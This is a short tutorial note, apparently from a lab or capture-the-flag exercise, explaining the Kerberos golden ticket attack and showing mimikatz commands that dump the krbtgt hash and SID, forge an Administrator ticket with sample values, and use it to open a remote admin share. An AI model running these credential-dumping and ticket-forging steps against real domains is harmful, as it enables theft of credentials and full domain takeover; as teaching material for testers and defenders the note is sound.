# Golden-Ticket-Attack

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

### Golden Ticket Attacks w/ mimikatz 
Using mimikatz.exe, we gonna dump the krbtgt hash and sid.
```markdown
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```



Now generate golden ticket using krbtgt hash and sid.
```markdown
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```
NOTE: id is set to 500 for golden ticket attack.

Now run the cmd to use ticket.
```markdown
misc::cmd
dir \\DESKTOP-1\c$
```

